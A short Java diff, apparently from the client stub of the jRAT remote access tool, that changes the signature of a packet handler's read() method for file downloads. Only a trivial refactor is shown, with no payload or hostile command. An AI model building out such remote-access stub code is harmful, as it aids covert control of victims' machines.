@@ -7,7 +7,7 @@ import se.jrat.stub.Connection;
 public class Packet104ClientDownloadPart extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		final String remotePath = Connection.instance.readLine();
 
 		TransferData localData = FileCache.get(remotePath);
